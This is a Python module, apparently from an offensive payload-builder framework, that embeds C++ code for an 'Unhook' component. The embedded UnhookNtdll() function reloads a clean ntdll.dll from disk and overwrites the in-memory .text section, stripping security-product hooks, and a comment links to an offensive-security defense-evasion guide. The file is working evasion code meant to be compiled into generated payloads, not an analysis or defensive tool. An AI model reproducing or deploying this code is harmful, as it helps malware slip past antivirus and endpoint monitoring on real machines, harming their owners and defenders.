import os

from engine.component.AntiDebugComponent import AntiDebugComponent
from engine.component.CodeComponent import CodeComponent
from engine.component.DefineComponent import DefineComponent
from engine.component.UnookComponent import UnhookComponent
from engine.component.UsingComponent import UsingComponent
from engine.modules.TemplateModule import TemplateModule, ModuleNotCompatibleException
from enums.Architectures import Arch
from enums.Language import Language
from utils.utils import get_project_root


class UnhookModule(TemplateModule):
    def generate(self, **kwargs):
        pass

    def build(self, **kwargs):
        pass

    def __init__(self, **kwargs):

        language = kwargs["kwargs"]["language"]
        arch = kwargs["kwargs"]["arch"]

        if language == Language.CPP:
            components = [
                UsingComponent("<psapi.h>", language=language),
                CodeComponent(r"""
                    int UnhookNtdll()
                    {
                        // https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
                        HANDLE process = GetCurrentProcess();
                        MODULEINFO mi = {};
                        HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
                    
                        if (ntdllModule == 0) {
                            printf("[-] Invalid Ntdll module handle");
                            return 1;
                        }
                    
                        GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
                        LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
                        HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
                        HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
                    
                        if (ntdllMapping == 0) {
                            printf("[-] Invalid Ntdll mapping handle");
                            return 1;
                        }
                    
                        LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
                    
                        PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
                        PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
                    
                        for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
                            PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
                    
                            if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
                                DWORD oldProtection = 0;
                                bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
                                memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
                                isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
                            }
                        }
                    
                        CloseHandle(process);
                        CloseHandle(ntdllFile);
                        CloseHandle(ntdllMapping);
                        FreeLibrary(ntdllModule);
                    
                        return 0;
                    }
                """),
                UnhookComponent("UnhookNtdll();"),
            ]
            libraries = ["dbghelp.lib"]
        else:
            raise ModuleNotCompatibleException()
        super().__init__(name="Unhook", libraries=libraries, components=components, arch=arch)
